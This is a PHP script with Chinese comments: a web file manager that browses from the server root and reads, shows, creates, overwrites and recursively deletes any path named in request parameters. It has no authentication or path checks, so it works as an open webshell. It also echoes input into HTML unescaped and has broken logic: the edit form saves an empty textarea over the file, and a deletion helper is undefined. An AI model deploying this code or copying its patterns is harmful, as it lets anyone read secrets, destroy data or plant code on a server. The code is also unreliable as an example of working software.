<?php
//＝＝＝＝＝＝＝＝＝＝＝＝＝保存文件
        if ($_REQUEST['action'] == 'add') {
            if (strstr($_REQUEST['filename'], '.')) {//新建文件
                fopen($_REQUEST['dir5'].'/'.$_REQUEST['filename'], "w");
            }else{//新建文件夹
                mkdir($_REQUEST['dir5'].'/'.$_REQUEST['filename'],'0777');
            }
            echo '<script>alert(\'新建成功\');history.go(-1);</script>';exit;
        }
        //======================保存文件结束

        //＝＝＝＝＝＝＝＝＝＝＝＝删除文件
        if ($_REQUEST['action'] == 'del') {
            //先删除目录下的文件：
            $dir = $_REQUEST['dir4'];
            if (strstr($dir, '.')) {
                unlink($dir);
            }else{
                $dh = opendir($dir);
                while ($file=readdir($dh)) {
                    if($file!="." && $file!="..") {
                        $fullpath=$dir."/".$file;
                        if(!is_dir($fullpath)) {
                            unlink($fullpath);
                        } else {
                            deldir($fullpath);
                        }
                    }
                }
                 
                closedir($dh);
                //删除当前文件夹：
                rmdir($dir);
            }

            echo '<script>alert(\'删除成功\');history.go(-1);</script>';
            exit;
        }
        //＝＝＝＝＝＝＝＝＝＝＝＝删除文件结束



        //＝＝＝＝＝＝＝＝＝＝＝＝＝保存文件
        if ($_REQUEST['action'] == 'save') {
            file_put_contents($_REQUEST['dir3'], $_REQUEST['content']);
            echo '<script>alert(\'保存成功\');history.go(-1);</script>';exit;
        }
        //======================保存文件结束




        //＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝读取文件
        if ($_REQUEST['dir22']) {
            $content = file_get_contents($_REQUEST['dir2']);
            echo '<form method="post" action="?dir3='.$_REQUEST['dir22'].'&action=save"><textarea style="width:100%;height:400px;" name="content"></textarea>';
            echo '<br><br>';
            echo '<input type="submit" value="保存"></form>';
            exit;
        }

        if ($_REQUEST['dir2']) {
            $content = highlight_file($_REQUEST['dir2']);
            echo $content;
            exit;
        }

        //＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝读取文件结束




        //＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝读取列表
        $dir = $_REQUEST['dir'] ? $_REQUEST['dir'] : '/';
        $dir_arr = explode('/', $dir);
        for ($i=0; $i < count($dir_arr)-1; $i++) { 
            $shangyiji .= $dir_arr[$i].'/';
        }
        $shangyiji = rtrim($shangyiji,'/');
        echo '<span style="width:10%;height:50px;float:left">';
        echo '<a href="?dir='.$shangyiji.'">返回上一级</a>&nbsp;&nbsp;&nbsp;</span>';
        echo '<span style="width:90%;height:50px;float:left"><form method="post" action="?dir5='.$dir.'&action=add"><input name="filename" type="text"> <input type="submit" value="新建"></form>';
        echo '</span>';
        if (is_dir($dir)) {
            if ($dh = opendir($dir)) {
                while (($file = readdir($dh)) !== false) {
                    $arr[] = $file;
                } closedir($dh);
                sort($arr);
                if ($dir == '/') {
                    $dir = '';
                }
                foreach ($arr as $key => $value) {
                    if (strstr($value, '.')) {
                        continue;
                    }
                    echo '<span style="width:300px;height:50px;float:left">';
                    echo '<a href="?dir='.$dir.'/'.$value.'">'.$value.'</a>&nbsp;&nbsp;<a href="javascript:if(confirm(\'确定删除吗？\')){location.href=\'?action=del&dir4='.$dir.'/'.$value.'\'}">删除</a>&nbsp;&nbsp;('.substr(base_convert(@fileperms($dir.'/'.$value),10,8),-4).')';
                    echo '</span>';
                }
                foreach ($arr as $key => $value) {
                    if ($value == '.' || $value == '..' || !strstr($value, '.') || $value == '.DS_Store') {
                        continue;
                    }
                    echo '<span style="width:300px;height:50px;float:left">';
                    echo '<a href="?dir2='.$dir.'/'.$value.'" target="_blank"><font color=red>'.$value.'</font></a>&nbsp;&nbsp;<a href="?dir22='.$dir.'/'.$value.'" target="_blank"><font color=red>修改</font></a>&nbsp;&nbsp;<a href="javascript:if(confirm(\'确定删除吗？\')){location.href=\'?action=del&dir4='.$dir.'/'.$value.'\'}">删除</a>&nbsp;&nbsp;('.substr(base_convert(@fileperms($dir.'/'.$value),10,8),-4).')';
                    echo '</span>';
                }
            }
        }
        //＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝读取列表结束
?>